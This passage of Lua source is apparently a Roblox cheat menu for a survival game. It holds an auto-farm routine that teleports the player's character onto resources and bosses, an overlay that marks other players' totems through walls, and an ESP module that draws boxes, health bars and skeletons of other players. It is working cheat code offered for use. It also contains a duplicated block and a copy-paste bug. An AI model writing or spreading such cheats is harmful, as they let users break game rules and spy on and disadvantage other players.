											and AutoFarmName.Value == "Crystal Guardian" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
									until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Crystal Guardian"
									WaitUntillBreak = true
									wait(AutoFarmWait.Value / 10)
									WaitUntillBreak = false
								end
							end

							if game.Workspace.Resources:FindFirstChild("Crystal Lode") and AutoFarmName.Value == "Crystal Lode" then

								local orgin = game.Workspace.Resources:FindFirstChild("Crystal Lode")
								local teleport = orgin["Reference"]

								if AutoFarmName.Value == "Crystal Lode" and orgin.Name == "Crystal Lode" and AutoFarm.Enabled == true then
									repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
											and AutoFarmName.Value == "Crystal Lode" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
									until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Crystal Lode"
									WaitUntillBreak = true
									wait(AutoFarmWait.Value / 10)
									WaitUntillBreak = false
								end
							end

							if game.Workspace.Resources:FindFirstChild("Swoll Tree") and AutoFarmName.Value == "Swoll Tree" then

								local orgin = game.Workspace.Resources:FindFirstChild("Swoll Tree")
								local teleport = orgin.Trunk

								if AutoFarmName.Value == "Swoll Tree" and orgin.Name == "Swoll Tree" and AutoFarm.Enabled == true then
									repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true and AutoFarmName.Value == "Swoll Tree" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
									until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Swoll Tree"
									WaitUntillBreak = true
									wait(AutoFarmWait.Value / 10)
									WaitUntillBreak = false
								end
							end


							if AutoFarmName.Value == "Ice Mound" then

								for i,orgin in pairs(game.Workspace.Resources:GetChildren()) do
									if orgin.ClassName == "Model" then
										if orgin.Name == "Ice Mound" then

											if AutoFarmName.Value == "Ice Mound" and AutoFarm.Enabled == true and orgin:FindFirstChild("Small Rock") then
												local teleport = orgin["Small Rock"]
												repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
														and AutoFarmName.Value == "Ice Mound" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
												until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Ice Mound"
												WaitUntillBreak = true
												wait(AutoFarmWait.Value / 10)
												WaitUntillBreak = false
											end
										end
									end
								end

							end

							if AutoFarmName.Value == "Adurite Node" then

								for i,orgin in pairs(game.Workspace.Resources:GetChildren()) do
									if orgin.ClassName == "Model" then
										if orgin.Name == "Adurite Node" then

											if AutoFarmName.Value == "Adurite Node" and AutoFarm.Enabled == true and orgin:FindFirstChild("Small Rock") then
												local teleport = orgin["Small Rock"]
												repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
														and AutoFarmName.Value == "Adurite Node" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
												until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Adurite Node"
												WaitUntillBreak = true
												wait(AutoFarmWait.Value / 10)
												WaitUntillBreak = false
											end
										end
									end
								end

							end

							if AutoFarmName.Value == "Silver Nugget" then

								for i,orgin in pairs(game.Workspace.Resources:GetChildren()) do
									if orgin.ClassName == "Model" then
										if orgin.Name == "Silver Nugget" then

											if AutoFarmName.Value == "Silver Nugget" and AutoFarm.Enabled == true and orgin:FindFirstChild("Reference") then
												local teleport = orgin["Reference"]
												repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
														and AutoFarmName.Value == "Silver Nugget" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
												until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Silver Nugget"
												WaitUntillBreak = true
												wait(AutoFarmWait.Value / 10)
												WaitUntillBreak = false
											end
										end
									end
								end

							end

							if AutoFarmName.Value == "Meteor Core" then

								for i,orgin in pairs(game.Workspace.Resources:GetChildren()) do
									if orgin.ClassName == "Model" then
										if orgin.Name == "Meteor Core" then

											if AutoFarmName.Value == "Meteor Core" and AutoFarm.Enabled == true and orgin:FindFirstChild("Small Rock") then
												local teleport = orgin["Small Rock"]
												repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
														and AutoFarmName.Value == "Meteor Core" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
												until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Meteor Core"
												WaitUntillBreak = true
												wait(AutoFarmWait.Value / 10)
												WaitUntillBreak = false
											end
										end
									end
								end

							end


							if AutoFarmName.Value == "Beached Boi" then

								for i,orgin in pairs(game.Workspace.Resources:GetChildren()) do
									if orgin.ClassName == "Model" then
										if orgin.Name == "Beached Boi" then

											if AutoFarmName.Value == "Beached Boi" and AutoFarm.Enabled == true and orgin:FindFirstChild("Torso") then
												local teleport = orgin["Torso"]
												repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
														and AutoFarmName.Value == "Meteor Core" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
												until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Beached Boi"
												WaitUntillBreak = true
												wait(AutoFarmWait.Value / 10)
												WaitUntillBreak = false
											end
										end
									end
								end

							end


							if AutoFarmName.Value == "Beached Boi" then

								for i,orgin in pairs(game.Workspace.Resources:GetChildren()) do
									if orgin.ClassName == "Model" then
										if orgin.Name == "Beached Boi" then

											if AutoFarmName.Value == "Beached Boi" and AutoFarm.Enabled == true and orgin:FindFirstChild("Torso") then
												local teleport = orgin["Torso"]
												repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
														and AutoFarmName.Value == "Meteor Core" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
												until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Beached Boi"
												WaitUntillBreak = true
												wait(AutoFarmWait.Value / 10)
												WaitUntillBreak = false
											end
										end
									end
								end

							end

							if AutoFarmName.Value == "Miserable God" then

								for i,orgin in pairs(game.Workspace.Resources:GetChildren()) do
									if orgin.ClassName == "Model" then
										if orgin.Name == "Miserable God" then

											if AutoFarmName.Value == "Miserable God" and AutoFarm.Enabled == true and orgin:FindFirstChild("Moai") then
												local teleport = orgin["Moai"]
												repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
														and AutoFarmName.Value == "Miserable God" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
												until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Miserable God"
												WaitUntillBreak = true
												wait(AutoFarmWait.Value / 10)
												WaitUntillBreak = false
											end
										end
										if orgin.Name == "Miserable Goddess" then

											if AutoFarmName.Value == "Miserable Goddess" and AutoFarm.Enabled == true and orgin:FindFirstChild("Miserable Goddess") then
												local teleport = orgin["Miserable Goddess"]
												repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
														and AutoFarmName.Value == "Miserable Goddess" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
												until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Miserable Goddess"
												WaitUntillBreak = true
												wait(AutoFarmWait.Value / 10)
												WaitUntillBreak = false
											end
										end
									end
								end

							end
							
							if AutoFarmName.Value == "Old God" then

								for i,orgin in pairs(game.Workspace.Resources:GetChildren()) do
									if orgin.ClassName == "Model" then
										if orgin.Name == "Old God" then

											if AutoFarmName.Value == "Old God" and AutoFarm.Enabled == true and orgin:FindFirstChild("Moai") then
												local teleport = orgin["Moai"]
												repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
														and AutoFarmName.Value == "Old God" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
												until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Old God"
												WaitUntillBreak = true
												wait(AutoFarmWait.Value / 10)
												WaitUntillBreak = false
											end
										end
									end
								end

							end

							if AutoFarmName.Value == "Wealthy God" then

								for i,orgin in pairs(game.Workspace.Resources:GetChildren()) do
									if orgin.ClassName == "Model" then
										if orgin.Name == "Wealthy God" then

											if AutoFarmName.Value == "Wealthy God" and AutoFarm.Enabled == true and orgin:FindFirstChild("Moai") then
												local teleport = orgin["Moai"]
												repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
														and AutoFarmName.Value == "Wealthy God" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
												until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Wealthy God"
												WaitUntillBreak = true
												wait(AutoFarmWait.Value / 10)
												WaitUntillBreak = false
											end
										end
									end
								end

							end

							if AutoFarmName.Value == "Lonely God" then

								for i,orgin in pairs(game.Workspace.Resources:GetChildren()) do
									if orgin.ClassName == "Model" then
										if orgin.Name == "Lonely God" then

											if AutoFarmName.Value == "Lonely God" and AutoFarm.Enabled == true and orgin:FindFirstChild("Moai") then
												local teleport = orgin["Moai"]
												repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
														and AutoFarmName.Value == "Lonely God" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
												until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Lonely God"
												WaitUntillBreak = true
												wait(AutoFarmWait.Value / 10)
												WaitUntillBreak = false
											end
										end
									end
								end

							end

							if AutoFarmName.Value == "Hateful God" then

								for i,orgin in pairs(game.Workspace.Resources:GetChildren()) do
									if orgin.ClassName == "Model" then
										if orgin.Name == "Hateful God" then

											if AutoFarmName.Value == "Hateful God" and AutoFarm.Enabled == true and orgin:FindFirstChild("Moai") then
												local teleport = orgin["Moai"]
												repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
														and AutoFarmName.Value == "Hateful God" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
												until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Hateful God"
												WaitUntillBreak = true
												wait(AutoFarmWait.Value / 10)
												WaitUntillBreak = false
											end
										end
									end
								end

							end

							if AutoFarmName.Value == "Yana" then

								for i,orgin in pairs(game.Workspace.Resources:GetChildren()) do
									if orgin.ClassName == "Model" then
										if orgin.Name == "Yana" then

											if AutoFarmName.Value == "Yana" and AutoFarm.Enabled == true and orgin:FindFirstChild("Moai") then
												local teleport = orgin["Moai"]
												repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
														and AutoFarmName.Value == "Yana" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
												until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Yana"
												WaitUntillBreak = true
												wait(AutoFarmWait.Value / 10)
												WaitUntillBreak = false
											end
										end
									end
								end

							end

							if AutoFarmName.Value == "Kax" then

								for i,orgin in pairs(game.Workspace.Resources:GetChildren()) do
									if orgin.ClassName == "Model" then
										if orgin.Name == "Kax" then

											if AutoFarmName.Value == "Kax" and AutoFarm.Enabled == true and orgin:FindFirstChild("Moai") then
												local teleport = orgin["Moai"]
												repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
														and AutoFarmName.Value == "Kax" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
												until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Kax"
												WaitUntillBreak = true
												wait(AutoFarmWait.Value / 10)
												WaitUntillBreak = false
											end
										end
									end
								end

							end


						end
					end)

				else
					WaitUntillBreak = false
				end
			end,
			["HoverText"] = "teleport to resources and farm",
			["Default"] = false,
			
		})
		AutoFarmName = AutoFarm.CreateDropdown({
			["Name"] = "Select Resource",
			["List"] = {"Small Tree", 
				"Sun Tree",
				"Swoll Tree",
				"Small Rock",
				"Gold Node",
				"Beached Boi",
				"Crystal Lode",
				"Stone Shelly",
				"Adurite Shelly",
				"Goober",
				"Iron Node",
				"Silver Node",
				"Bush",
				"Coal Node",
				"Ancient Tree",
				"Cactus",
				"Driftwood",
				"Ice Chunk",
				"Ice Mound",
				"Banto",
				"Bantae",
				"Peeper",
				"Coal Shelly",
				"Gold Shelly",
				"Crystal Guardian",
				"Crystal Lode",
				"Silver Nugget",
				"Adurite Node",
				"Meteor Core",
				"Old God",
				"Wealthy God",
				"Lonely God",
				"Hateful God",
				"Miserable God",
				"Yana",
				"Kax",
			},
			["Function"] = function(val)
			end
		})

		AutoFarmWait = AutoFarm.CreateSlider({
			["Name"] = "Collect Wait",
			["Min"] = 0,
			["Max"] = 2000,
			["Function"] = function(val)
			end,
			["HoverText"] = "sets a delay so you can pick up your stuff",
			["Default"] = 20
		})
	end)

	runcode(function()
		local Totems = {["Enabled"] = false}
		Totems = GuiLibrary["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Totems",
			["Function"] = function(callback) if callback then 
					spawn(function()
						while wait(0.1) and Totems.Enabled == true do


							for i,v in pairs(game.Workspace.Totems:GetChildren()) do
								if v:FindFirstChild("Board") and v:FindFirstChild("Coloration") then
									if v.Board:FindFirstChild("TotemImage") == nil then
										local BillboardGui = Instance.new("BillboardGui")
										local ImageLabel = Instance.new("ImageLabel")

										BillboardGui.Parent = v.Board
										BillboardGui.Name = "TotemImage"
										BillboardGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
										BillboardGui.Active = true
										BillboardGui.AlwaysOnTop = true
										BillboardGui.LightInfluence = 1.000
										BillboardGui.Size = UDim2.new(3, 0, 3, 0)
										BillboardGui.SizeOffset = Vector2.new(0, 30)

										ImageLabel.Parent = BillboardGui
										ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
										ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
										ImageLabel.BackgroundTransparency = 1.000
										ImageLabel.Size = UDim2.new(0, 40, 0, 40)
										ImageLabel.Image = "rbxassetid://1452566074"
										ImageLabel.ImageColor3 = v.Coloration.Color
									end
								end
							end
						end
					end)

				else

					for i,v in pairs(game.Workspace.Totems:GetChildren()) do
						if v:FindFirstChild("Board") and v:FindFirstChild("Coloration") then
							if v.Board:FindFirstChild("TotemImage") then
								v.Board:FindFirstChild("TotemImage"):Destroy()
							end
						end
					end


				end
			end,
			["HoverText"] = "see other totems",
			["Default"] = false,
			["ExtraText"] = function() return " Placeholder" end
		})
	end)

	runcode(function()

		local ESPFolder = Instance.new("Folder")
		ESPFolder.Name = "ESPFolder"
		ESPFolder.Parent = GuiLibrary["MainGui"]
		local espfolderdrawing = {}
		players.PlayerRemoving:connect(function(plr)
			if ESPFolder:FindFirstChild(plr.Name) then
				ESPFolder[plr.Name]:Remove()
			end
			if espfolderdrawing[plr.Name] then
				pcall(function()
					pcall(function()
						espfolderdrawing[plr.Name].Quad1:Remove()
						espfolderdrawing[plr.Name].Quad2:Remove()
						espfolderdrawing[plr.Name].Quad3:Remove()
						espfolderdrawing[plr.Name].Quad4:Remove()
					end)
					pcall(function()
						espfolderdrawing[plr.Name].Head:Remove()
						espfolderdrawing[plr.Name].Head2:Remove()
						espfolderdrawing[plr.Name].Torso:Remove()
						espfolderdrawing[plr.Name].Torso2:Remove()
						espfolderdrawing[plr.Name].Torso3:Remove()
						espfolderdrawing[plr.Name].LeftArm:Remove()
						espfolderdrawing[plr.Name].RightArm:Remove()
						espfolderdrawing[plr.Name].LeftLeg:Remove()
						espfolderdrawing[plr.Name].RightLeg:Remove()
					end)
					espfolderdrawing[plr.Name] = nil
				end)
			end
		end)

		local function floorpos(pos)
			return Vector2.new(math.floor(pos.X), math.floor(pos.Y))
		end

		local ESPColor = {["Value"] = 0.44}
		local ESPHealthBar = {["Enabled"] = false}
		local ESPMethod = {["Value"] = "2D"}
		local ESPDrawing = {["Enabled"] = false}
		local ESPTeammates = {["Enabled"] = true}
		local ESP = GuiLibrary["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"].CreateOptionsButton({
			["Name"] = "ESP", 
			["Function"] = function(callback) 
				if callback then
					spawn(function()
						BindToRenderStep("ESP", 500, function()
							for i,plr in pairs(players:GetChildren()) do
								local thing
								if ESPDrawing["Enabled"] then 
									if ESPMethod["Value"] == "2D" then
										if espfolderdrawing[plr.Name] then
											thing = espfolderdrawing[plr.Name]
											thing.Quad1.Visible = false
											thing.Quad1.Color = getPlayerColor(plr) or Color3.fromHSV(ESPColor["Hue"], ESPColor["Sat"], ESPColor["Value"])
											thing.Quad2.Visible = false
											thing.Quad3.Visible = false
											thing.Quad4.Visible = false
										else
											espfolderdrawing[plr.Name] = {}
											espfolderdrawing[plr.Name].Quad1 = Drawing.new("Quad")
											espfolderdrawing[plr.Name].Quad1.Thickness = 1
											espfolderdrawing[plr.Name].Quad1.ZIndex = 2
											espfolderdrawing[plr.Name].Quad1.Color = Color3.new(1, 1, 1)
											espfolderdrawing[plr.Name].Quad2 = Drawing.new("Quad")
											espfolderdrawing[plr.Name].Quad2.Thickness = 2
											espfolderdrawing[plr.Name].Quad2.ZIndex = 1
											espfolderdrawing[plr.Name].Quad2.Color = Color3.new(0, 0, 0)
											espfolderdrawing[plr.Name].Quad3 = Drawing.new("Line")
											espfolderdrawing[plr.Name].Quad3.Thickness = 1
											espfolderdrawing[plr.Name].Quad3.ZIndex = 2
											espfolderdrawing[plr.Name].Quad3.Color = Color3.new(0, 0, 0)
											espfolderdrawing[plr.Name].Quad4 = Drawing.new("Line")
											espfolderdrawing[plr.Name].Quad4.Thickness = 2
											espfolderdrawing[plr.Name].Quad4.ZIndex = 1
											espfolderdrawing[plr.Name].Quad4.Color = Color3.new(0, 0, 0)
											thing = espfolderdrawing[plr.Name]
										end

										if isAlive(plr) and plr ~= lplr and (ESPTeammates["Enabled"] or shared.vapeteamcheck(plr)) then
											local rootPos, rootVis = cam:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
											local rootSize = (plr.Character.HumanoidRootPart.Size.X * 1200) * (cam.ViewportSize.X / 1920)
											local headPos, headVis = cam:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position + Vector3.new(0, 1 + (plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and 2 or plr.Character.Humanoid.HipHeight), 0))
											local legPos, legVis = cam:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position - Vector3.new(0, 1 + (plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and 2 or plr.Character.Humanoid.HipHeight), 0))
											rootPos = rootPos
											if rootVis then
												--thing.Visible = rootVis
												local sizex, sizey = (rootSize / rootPos.Z), (headPos.Y - legPos.Y) 
												local posx, posy = (rootPos.X - sizex / 2),  ((rootPos.Y - sizey / 2))
												if ESPHealthBar["Enabled"] then
													local color = HealthbarColorTransferFunction(plr.Character.Humanoid.Health / plr.Character.Humanoid.MaxHealth)
													thing.Quad3.Color = color
													thing.Quad3.Visible = true
													thing.Quad4.From = floorpos(Vector2.new(posx - 4, posy + 1))
													thing.Quad4.To = floorpos(Vector2.new(posx - 4, posy + sizey - 1))
													thing.Quad4.Visible = true
													local healthposy = sizey * math.clamp(plr.Character.Humanoid.Health / plr.Character.Humanoid.MaxHealth, 0, 1)
													thing.Quad3.From = floorpos(Vector2.new(posx - 4, posy + sizey - (sizey - healthposy)))
													thing.Quad3.To = floorpos(Vector2.new(posx - 4, posy))
													--thing.HealthLineMain.Size = UDim2.new(0, 1, math.clamp(plr.Character.Humanoid.Health / plr.Character.Humanoid.MaxHealth, 0, 1), (math.clamp(plr.Character.Humanoid.Health / plr.Character.Humanoid.MaxHealth, 0, 1) == 0 and 0 or -2))
												end
												thing.Quad1.PointA = floorpos(Vector2.new(posx + sizex, posy))
												thing.Quad1.PointB = floorpos(Vector2.new(posx, posy))
												thing.Quad1.PointC = floorpos(Vector2.new(posx, posy + sizey))
												thing.Quad1.PointD = floorpos(Vector2.new(posx + sizex, posy + sizey))
												thing.Quad1.Visible = true
												thing.Quad2.PointA = floorpos(Vector2.new(posx + sizex, posy))
												thing.Quad2.PointB = floorpos(Vector2.new(posx, posy))
												thing.Quad2.PointC = floorpos(Vector2.new(posx, posy + sizey))
												thing.Quad2.PointD = floorpos(Vector2.new(posx + sizex, posy + sizey))
												thing.Quad2.Visible = true
											end
										end
									else
										if espfolderdrawing[plr.Name] then
											thing = espfolderdrawing[plr.Name]
											for linenum, line in pairs(thing) do
												line.Color = getPlayerColor(plr) or Color3.fromHSV(ESPColor["Hue"], ESPColor["Sat"], ESPColor["Value"])
												line.Visible = false
											end
										else
											thing = {}
											thing.Head = Drawing.new("Line")
											thing.Head2 = Drawing.new("Line")
											thing.Torso = Drawing.new("Line")
											thing.Torso2 = Drawing.new("Line")
											thing.Torso3 = Drawing.new("Line")
											thing.LeftArm = Drawing.new("Line")
											thing.RightArm = Drawing.new("Line")
											thing.LeftLeg = Drawing.new("Line")
											thing.RightLeg = Drawing.new("Line")
											espfolderdrawing[plr.Name] = thing
										end

										if isAlive(plr) and plr ~= lplr and (ESPTeammates["Enabled"] or shared.vapeteamcheck(plr)) then
											local rootPos, rootVis = cam:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
											if rootVis and plr.Character:FindFirstChild((plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Torso" or "UpperTorso")) and plr.Character:FindFirstChild((plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Left Arm" or "LeftHand")) and plr.Character:FindFirstChild((plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Right Arm" or "RightHand")) and plr.Character:FindFirstChild((plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Left Leg" or "LeftFoot")) and plr.Character:FindFirstChild((plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Right Leg" or "RightFoot")) and plr.Character:FindFirstChild("Head") then
												local head = CalculateObjectPosition((plr.Character["Head"].CFrame).p)
												local headfront = CalculateObjectPosition((plr.Character["Head"].CFrame * CFrame.new(0, 0, -0.5)).p)
												local toplefttorso = CalculateObjectPosition((plr.Character[(plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Torso" or "UpperTorso")].CFrame * CFrame.new(-1.5, 0.8, 0)).p)
												local toprighttorso = CalculateObjectPosition((plr.Character[(plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Torso" or "UpperTorso")].CFrame * CFrame.new(1.5, 0.8, 0)).p)
												local toptorso = CalculateObjectPosition((plr.Character[(plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Torso" or "UpperTorso")].CFrame * CFrame.new(0, 0.8, 0)).p)
												local bottomtorso = CalculateObjectPosition((plr.Character[(plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Torso" or "UpperTorso")].CFrame * CFrame.new(0, -0.8, 0)).p)
												local bottomlefttorso = CalculateObjectPosition((plr.Character[(plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Torso" or "UpperTorso")].CFrame * CFrame.new(-0.5, -0.8, 0)).p)
												local bottomrighttorso = CalculateObjectPosition((plr.Character[(plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Torso" or "UpperTorso")].CFrame * CFrame.new(0.5, -0.8, 0)).p)
												local leftarm = CalculateObjectPosition((plr.Character[(plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Left Arm" or "LeftHand")].CFrame * CFrame.new(0, -0.8, 0)).p)
												local rightarm = CalculateObjectPosition((plr.Character[(plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Right Arm" or "RightHand")].CFrame * CFrame.new(0, -0.8, 0)).p)
												local leftleg = CalculateObjectPosition((plr.Character[(plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Left Leg" or "LeftFoot")].CFrame * CFrame.new(0, -0.8, 0)).p)
												local rightleg = CalculateObjectPosition((plr.Character[(plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Right Leg" or "RightFoot")].CFrame * CFrame.new(0, -0.8, 0)).p)
												thing.Torso.From = toplefttorso
												thing.Torso.To = toprighttorso
												thing.Torso.Visible = true
												thing.Torso2.From = toptorso
												thing.Torso2.To = bottomtorso
												thing.Torso2.Visible = true
												thing.Torso3.From = bottomlefttorso
												thing.Torso3.To = bottomrighttorso
												thing.Torso3.Visible = true
												thing.LeftArm.From = toplefttorso
												thing.LeftArm.To = leftarm
												thing.LeftArm.Visible = true
												thing.RightArm.From = toprighttorso
												thing.RightArm.To = rightarm
												thing.RightArm.Visible = true
												thing.LeftLeg.From = bottomlefttorso
												thing.LeftLeg.To = leftleg
												thing.LeftLeg.Visible = true
												thing.RightLeg.From = bottomrighttorso
												thing.RightLeg.To = rightleg
												thing.RightLeg.Visible = true
												thing.Head.From = toptorso
												thing.Head.To = head
												thing.Head.Visible = true
												thing.Head2.From = head
												thing.Head2.To = headfront
												thing.Head2.Visible = true
										--[[CalculateLine(toplefttorso, toprighttorso, thing.TopTorsoLine)
										CalculateLine(toptorso, bottomtorso, thing.MiddleTorsoLine)
										CalculateLine(bottomlefttorso, bottomrighttorso, thing.BottomTorsoLine)
										CalculateLine(toplefttorso, leftarm, thing.LeftArm)
										CalculateLine(toprighttorso, rightarm, thing.RightArm)
										CalculateLine(bottomlefttorso, leftleg, thing.LeftLeg)
										CalculateLine(bottomrighttorso, rightleg, thing.RightLeg)
										CalculateLine(toptorso, head, thing.Head)
										CalculateLine(head, headfront, thing.HeadForward)]]
											end
										end
									end
								else
									if ESPMethod["Value"] == "2D" then
										if ESPFolder:FindFirstChild(plr.Name) then
											thing = ESPFolder[plr.Name]
											thing.Visible = false
											thing.Line1.BackgroundColor3 = getPlayerColor(plr) or Color3.fromHSV(ESPColor["Hue"], ESPColor["Sat"], ESPColor["Value"])
											thing.Line2.BackgroundColor3 = getPlayerColor(plr) or Color3.fromHSV(ESPColor["Hue"], ESPColor["Sat"], ESPColor["Value"])
											thing.Line3.BackgroundColor3 = getPlayerColor(plr) or Color3.fromHSV(ESPColor["Hue"], ESPColor["Sat"], ESPColor["Value"])
											thing.Line4.BackgroundColor3 = getPlayerColor(plr) or Color3.fromHSV(ESPColor["Hue"], ESPColor["Sat"], ESPColor["Value"])
										else
											thing = Instance.new("Frame")
											thing.BackgroundTransparency = 1
											thing.BorderSizePixel = 0
											thing.Visible = false
											thing.Name = plr.Name
											thing.Parent = ESPFolder
											local line1 = Instance.new("Frame")
											line1.BorderSizePixel = 0
											line1.Name = "Line1"
											line1.ZIndex = 2
											line1.Size = UDim2.new(1, -2, 0, 1)
											line1.Position = UDim2.new(0, 1, 0, 1)
											line1.BackgroundColor3 = getPlayerColor(plr) or Color3.fromHSV(ESPColor["Hue"], ESPColor["Sat"], ESPColor["Value"])
											line1.Parent = thing
											local line2 = Instance.new("Frame")
											line2.BorderSizePixel = 0
											line2.Name = "Line2"
											line2.Size = UDim2.new(1, -2, 0, 1)
											line2.ZIndex = 2
											line2.Position = UDim2.new(0, 1, 1, -2)
											line2.BackgroundColor3 = getPlayerColor(plr) or Color3.fromHSV(ESPColor["Hue"], ESPColor["Sat"], ESPColor["Value"])
											line2.Parent = thing
											local line3 = Instance.new("Frame")
											line3.BorderSizePixel = 0
											line3.Name = "Line3"
											line3.Size = UDim2.new(0, 1, 1, -2)
											line3.Position = UDim2.new(0, 1, 0, 1)
											line3.ZIndex = 2
											line3.BackgroundColor3 = getPlayerColor(plr) or Color3.fromHSV(ESPColor["Hue"], ESPColor["Sat"], ESPColor["Value"])
											line3.Parent = thing
											local line4 = Instance.new("Frame")
											line4.BorderSizePixel = 0
											line4.Name = "Line4"
											line4.Size = UDim2.new(0, 1, 1, -2)
											line4.Position = UDim2.new(1, -2, 0, 1)
											line4.ZIndex = 2
											line4.BackgroundColor3 = getPlayerColor(plr) or Color3.fromHSV(ESPColor["Hue"], ESPColor["Sat"], ESPColor["Value"])
											line4.Parent = thing
											local line1clone = line1:Clone()
											line1clone.ZIndex = 1
											line1clone.Size = UDim2.new(1, 0, 0, 3)
											line1clone.BackgroundTransparency = 0.5
											line1clone.Position = UDim2.new(0, 0, 0, 0)
											line1clone.BackgroundColor3 = Color3.new(0, 0, 0)
											line1clone.Parent = thing
											local line2clone = line2:Clone()
											line2clone.ZIndex = 1
											line2clone.Size = UDim2.new(1, 0, 0, 3)
